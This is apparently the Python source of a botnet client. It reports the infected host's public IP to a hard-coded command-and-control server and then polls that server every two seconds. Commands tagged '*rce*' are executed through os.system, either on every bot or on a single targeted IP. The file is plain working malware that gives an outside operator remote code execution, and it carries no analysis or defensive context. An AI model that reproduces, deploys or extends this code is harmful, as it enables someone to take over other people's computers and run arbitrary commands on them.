# imports
import requests, os, time
from os import system, name
import json, html, threading, random, sys

cnc_server = 'https://panel.cloudcant.repl.co'


def getinfo(type):
  response = requests.get('http://ifconfig.net/json')
  infojson = html.unescape(response.text)
  info = json.loads(infojson)
  return info[type]


botip = getinfo('ip')

requests.get(f"{cnc_server}/bot?connect={botip}")


def clear():
  if name == "nt":
    _ = system("cls")
  else:
    _ = system("clear")


# gettingn the command from the cnc server
def getcommand():
  global cnc_server
  cnc = requests.get(f"{cnc_server}/bot")
  command = html.unescape(cnc.text)
  return command


# logs
def log():
  global command
  command = getcommand()
  clear()
  print(f"""
  {botip}
  └── {cnc_server}/bot
      └── {command}
""")


# main process loop

while True:
  commanddec = getcommand()

  if '*rce*' in commanddec:
    remrcetag = (str(commanddec).replace('*rce*', ''))
    if "single" in remrcetag:
      type, command, ip = remrcetag.split("::")
      if ip == botip:
        os.system(command)
      else:
        pass
    elif "all" in remrcetag:
      type, command = remrcetag.split("::")
      os.system(command)
    else:
      pass

  elif "*print*" in commanddec:
    print(str(commanddec.replace('*print*', '')))
  else:
    pass
  log()
  time.sleep(2)
